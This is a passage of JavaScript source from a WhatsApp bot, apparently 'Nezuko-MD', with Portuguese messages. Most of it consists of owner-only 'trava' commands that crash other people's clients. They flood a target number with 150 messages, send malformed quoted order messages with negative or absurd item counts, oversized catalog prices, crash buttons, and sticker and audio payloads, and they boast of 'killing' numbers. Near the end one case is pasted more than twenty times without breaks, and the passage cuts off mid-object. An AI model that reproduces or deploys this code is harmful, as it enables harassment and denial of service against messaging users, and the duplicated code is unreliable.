nezuko.sendMessage(from, {text: `Enviei ${envi} travas para @${result.jid.split("@")[0]}`, mentions: [result.jid]})
} catch (err) {
console.log(err)
reply("Hmm deu erro")
}
break

case 'crash3':
if(!SoDono) return reply(enviar.msg.donosmt)
reply('cadê o nmr?') 
var count = 0;
var interval;
try {
swi_from = q.replace(new RegExp("[()+-/ +/]", "gi"), "").replace("@", '') + "@s.whatsapp.net";
if (q.indexOf('@') !== q.lastIndexOf('@')) return reply("Não pode mencionar 2 (dois) membros.")
if (swi_from != "" && swi_from != "@s.whatsapp.net") {
reply('Opa, já está indo de F!')
seoplooo = { key: { participant: "0@s.whatsapp.net", remoteJid: "0@g.us", }, message: {conversation: "derrubado 😎👍🏻" } }
interval = setInterval(() => {
 count++;
 if (count == 150) {
   clearInterval(interval);
 }
nezuko.sendMessage(swi_from, {text: ' '}, {quoted: seoplooo})
}, 500)
} else {
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return reply('Marque a mensagem da pessoa');
reply('Opa, já está indo de F!')
seoplooo = { key: { participant: "0@s.whatsapp.net", remoteJid: "0@g.us", }, message: {conversation: "derrubado😈" } }
interval = setInterval(() => {
 count++;
 if (count == 150) {
   clearInterval(interval);
 }
nezuko.sendMessage(`${mentioned}@s.whatsapp.net`, {text: ' '}, {quoted: seoplooo})
}, 500)
}
} catch (e) {
reply(String(e).includes("TypeError: Cannot read properties of null (reading 'contextInfo')") ? `❌ Erro! Não foi possível indentificar o tipo de marcação/menção.\n\n➡️ Exemplos:\n${prefix + command } @${numerodono[0].split("@")[0]}\n${prefix + command } ${numerodono[0].split("@")[0]}\nOu marque a mensagem do membro com ${prefix + command }`: reply('erro'))
console.log("Error : %s", color(e, "red"));
}
break

case 'suicidagp':
case 'matargp':
case 'crashgp':
if(!isGroup) return reply(enviar.msg.grupo)
if(!SoDono) return reply(enviar.msg.donosmt)
reply('😈𝘾𝙧𝙖𝙨𝙝𝙖𝙣𝙙𝙤 𝙏𝙪𝙙𝙤😈') 
let audcrash = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "0@g.us"}, "message": { orderMessage: { itemCount: -666, status: 200, jpegThumbnail: null, surface: 200, message: `${buttonkal}\n${travavideo}`, orderTitle: '❔🤣', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
nezuko.sendMessage(from, {text: '😈𝘾𝙧𝙖𝙨𝙝𝙖𝙣𝙙𝙤 𝙏𝙪𝙙𝙤😈'}, { quoted: audcrash}) 
break

case 'crashuser':
if(!SoDono) return sendButtonText(from, `\t\t*‼️ACESSO NEGADO‼️*`,`❗${pushname}, Você Não Tem Acesso Ao Comando De Crashuser.`, {quoted: info});
if (args.length == 0) return reply(`Exemplo: ${prefix + command} 5582999999`)
sendBtext(from, "😈️ 𝘾𝙍𝘼𝙎𝙃𝙐𝙎𝙀𝙍 𝙉𝙊𝙑𝘼𝙈𝙀𝙉𝙏𝙀? 😈️\n", `‼️${pushname} O Alvo: ${q} Já Recebeu Crashuser… Você Deseja Matar Esse Número Novamente?‼️`, [ {buttonId: `${prefix}crash2 ${q}`, buttonText: {displayText: `MATAR☠️`}, type: 1}, {buttonId: `${prefix}tchau`, buttonText: {displayText: `NAO 👋`}, type: 1}], dnselo);
let telpr = args.join(' ')
let craahspp = { key: { participant: "0@s.whatsapp.net", remoteJid: "0@g.us", }, message: {conversation: "nada haver isso aí animal" } }

if (telpr == '5521964523665') return reply('Não é possível usar crashuser o número do meu Mestre.');
if (telpr == '5521970623638') return reply('Não é possível usar crashuser o número do bot.');
if (telpr == '558288279194️') return reply('Não e possível usar crashuser nesse número');
if (telpr == '5511988255956') return reply('Não e possível usar crashuser nesse número.');
nezuko.sendMessage(`${telpr}@s.whatsapp.net`, {text: 'bom dia!'}, {quoted: craahspp })
break

case 'crashuserpv':
reply('😈𝘾𝙧𝙖𝙨𝙝𝙖𝙣𝙙𝙤 𝙏𝙪𝙙𝙤😈') 
if (!SoDono) return SoDono()
const tiim = args.join(" ") 
const nums = tiim.replace(/\D+/g, '');
if ( nums == "5521964523665" ) return env2("Não e possível enviar crashuser pro meu Mestre!", "🚫");
if ( nums == "5521970623638" ) return env2("Não e possível enviar crashuser!", "🚫");
if ( nums == "5511988255956" ) return env2("Não e possível enviar crashuser!", "🚫");
if ( nums == "558288279194️" ) return env2("Não e possível enviar crashuser!", "🚫");
let selooo = { key: { participant: "0@s.whatsapp.net", remoteJid: "0@g.us", }, message: {conversation: "nada haver isso aí animal" }, }
nezuko.sendMessage(`${nums}@s.whatsapp.net`, {text: 'tess'}, {quoted: selooo})
break

case 'tchau':
nezuko.sendMessage(from, { text: `Tchau ${pushname} 😇`}, { quoted: dnselo} )
break

case 'catalogo':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
var tod = await reSize(`./funções de cmd/mídia-ft-vd/fotos/nezuko.jpg`, 200, 200) 
var messa = await prepareWAMessageMedia({ image: tod}, { upload: nezuko.waUploadToServer })
var catalog = generateWAMessageFromContent(from, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "7091718154232528",
"title": `${listbug}`,
"description": `${buttonkal}\n${loc}`,
"footerText": `© _Copyright by Nezuko-MD_`,
"currencyCode": "IDR",
"priceAmount1000": "999999999999999999999999999999999",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "1000",
"retailerId": `Nezuko-MD`,
"url": `zap zap travado🤣️`
},
"businessOwnerJid": `5521964523665@s.whatsapp.net`,
}
}), { userJid: from, quoted: m })
nezuko.relayMessage(from, catalog.message, { messageId: catalog.key.id })
break

case 'carrinho': { 
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
var messa = await prepareWAMessageMedia({ image:  { url: 'https://telegra.ph/file/cf640249a841ff0e62c85.jpg' }}, { upload: nezuko.waUploadToServer })
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "orderMessage": {"orderId": "449756950375071","orderImage": thumb,"itemCount": 100000000000,"status": "INQUIRY","message": `KiLL  💖  iNFiNiTO   💖 \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`,
 "thumbnail": fs.readFileSync(`./src/travas/name.zip`), "surface": "CATALOG","orderTitle": `© copyright by Daniel`,"sellerJid": "6285723156229@s.whatsapp.net","token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==","totalAmount1000": "500000000000000", "totalCurrencyCode": "IDR",
}
}), { userJid: nezuko.user.id, quoted: m })
nezuko.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
break

case 'carrinho2': { 
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
var messa = await prepareWAMessageMedia({ image:  { url: 'https://telegra.ph/file/cf640249a841ff0e62c85.jpg' }}, { upload: nezuko.waUploadToServer })
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "orderMessage": {"orderId": "449756950375071","orderImage": thumb,"itemCount": 100000000000,"status": "INQUIRY","message": `${azrarel}`,
 "thumbnail": fs.readFileSync(`./src/travas/name.zip`), "surface": "CATALOG","orderTitle": `© copyright by Daniel`,"sellerJid": "6285723156229@s.whatsapp.net","token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==","totalAmount1000": "500000000000000", "totalCurrencyCode": "IDR",
}
}), { userJid: nezuko.user.id, quoted: m })
nezuko.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
break

case 'buttoncrash':
addFilter(from)  
if(!SoDono) return reply(enviar.msg.donosmt)
let buttonbugg = [
{buttonId: `crashed</>`, buttonText: {displayText: `${buttonkal}\n${travavideo}`}, type: 1},
{buttonId: `crashed</>`, buttonText: {displayText: `${buttonkal}\n${travavideo}`}, type: 1},
{buttonId: `crashed</>`, buttonText: {displayText: `${buttonkal}\n${travavideo}`}, type: 1}]
let selocrrash = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "0@g.us"}, "message": { orderMessage: { itemCount: -666, status: 200, jpegThumbnail: null, surface: 200, message: `${buttonkal}\n${travavideo}`, orderTitle: '❔🤣', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
let buttonbug = {
text: `😈𝘾𝙧𝙖𝙨𝙝𝙖𝙣𝙙𝙤 𝙏𝙪𝙙𝙤😈`,
footer: '🔥𝙊 𝙈𝙚𝙡𝙝𝙤𝙧 𝘿𝙖 𝘼𝙩𝙪𝙖𝙡𝙞𝙙𝙖𝙙𝙚🔥',
buttons: buttonbugg,
headerType: 2}
nezuko.sendMessage(m.chat, buttonbug, {quoted: selocrrash})
break

case 'buttonbug': {
addFilter(from)  
if(!SoDono) return reply(enviar.msg.donosmt)
let buttonbuugg = [
{buttonId: `crashed</>`, buttonText: {displayText: `${home}\n${travavideo}`}, type: 1},
{buttonId: `crashed</>`, buttonText: {displayText: `${home}\n${travavideo}`}, type: 1},
{buttonId: `crashed</>`, buttonText: {displayText: `${home}\n${travavideo}`}, type: 1}]
let buttonbuug = {
text: `😈𝙏𝙧𝙖𝙫𝙖𝙣𝙙𝙤 𝙏𝙪𝙙𝙤😈`,
footer: '🔥𝙊 𝙈𝙚𝙡𝙝𝙤𝙧 𝘿𝙖 𝘼𝙩𝙪𝙖𝙡𝙞𝙙𝙖𝙙𝙚🔥',
buttons: buttonbuugg,
headerType: 2}
nezuko.sendMessage(m.chat, buttonbuug, {quoted: dnselo})
}
break

case 'aud': case 'travaaudio': { 
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
let audcrash = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "0@g.us"}, "message": { orderMessage: { itemCount: -666, status: 200, jpegThumbnail: null, surface: 200, message: `${buttonkal}\n${travavideo}`, orderTitle: '❔🤣', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
nezuko.sendMessage(m.chat, {audio: fs.readFileSync("./src/travas/trava.mp3"), mimetype: 'audio/mp4'}, {quoted: audcrash})
}
break

case 'figucrash': 
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
nezuko.sendMessage(from, {sticker: fs.readFileSync('./src/travas/zap.webp') 
},{quoted: {
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "0@g.us"
},
"message": {
orderMessage: {
itemCount: 99999999,
status: 20000000000000000,
thumbnail: null,
surface: 20000000000000000000000000000,
message: "Kira 𝙙𝙚𝙧𝙧𝙪𝙗𝙖𝙣𝙙𝙤 𝙨𝙚𝙪 𝙯𝙞𝙥 𝙯𝙖𝙥", 
orderTitle: '',
sellerJid: '0@g.us'
}}, 
contextInfo: {
"forwardingScore":999999,
"isForwarded": true
},
sendEphemeral: true
}})
break

case 'murian':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
nezuko.sendMessage(m.chat, {text: `${murian}`}, {quoted: m})
break

case 'funeral':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
nezuko.sendMessage(m.chat, {text: `${funeral}`}, {quoted: m})
break

case 'lugia':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
nezuko.sendMessage(m.chat, {text: `${lugia}`}, {quoted: m})
break

case 'pv3':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
nezuko.sendMessage(m.chat, {text: `${pv3}`}, {quoted: m})
break

case 'explosion':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
nezuko.sendMessage(m.chat, {text: `${explosion}`}, {quoted: m})
break

case 'jamaicano':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
nezuko.sendMessage(m.chat, {text: `${jamaicano}`}, {quoted: m})
break

case 'malvadinha':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
nezuko.sendMessage(m.chat, {text: `${malvadinha}`}, {quoted: m})
break

case 'spanking':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
nezuko.sendMessage(m.chat, {text: `${spanking}`}, {quoted: m})
break

case 'cova':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
nezuko.sendMessage(m.chat, {text: `${cova}`}, {quoted: m})
break

case 'killed':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
nezuko.sendMessage(m.chat, {text: `${killed}`}, {quoted: m})
break

case 'sumiu':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
nezuko.sendMessage(m.chat, {text: `${sumiu}`}, {quoted: m})
break

case 'carrinho1':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
nezuko.sendMessage(m.chat, {text: `${carrinho}`}, {quoted: m})
break

case 'carrinhodesc':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
nezuko.sendMessage(m.chat, {text: `${carrinhodesc}`}, {quoted: m})
break

case 'carrinhofake':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
nezuko.sendMessage(m.chat, {text: `${carrinhofake}`}, {quoted: m})
break

case 'catalogo2':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
nezuko.sendMessage(m.chat, {text: `${catalogo}`}, {quoted: m})
break

case 'catalogodesc':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
nezuko.sendMessage(m.chat, {text: `${catalogodesc}`}, {quoted: m})
break

case 'convite1':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
nezuko.sendMessage(m.chat, {text: `${convite}`}, {quoted: m})
break

case 'doc':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
nezuko.sendMessage(m.chat, {text: `${doc}`}, {quoted: m})
break

case 'pdf':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
nezuko.sendMessage(m.chat, {text: `${pdf}`}, {quoted: m})
break

case 'pdfkill':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
nezuko.sendMessage(m.chat, {text: `${pdfkill}`}, {quoted: m})
break

case 'telapreta':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
nezuko.sendMessage(m.chat, {text: `${telapreta}`}, {quoted: m})
break

case 'pdff':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
nezuko.sendMessage(m.chat, {text: `${pdff}`}, {quoted: m})
break

case 'ngazap':
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
nezuko.sendMessage(m.chat, {text: `${ngazap}`}, {quoted: m})
break

//========FIM DAS TRAVAS=============\\

//========ESPECIAL=============\\

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true
}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true
}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true
}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true
}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
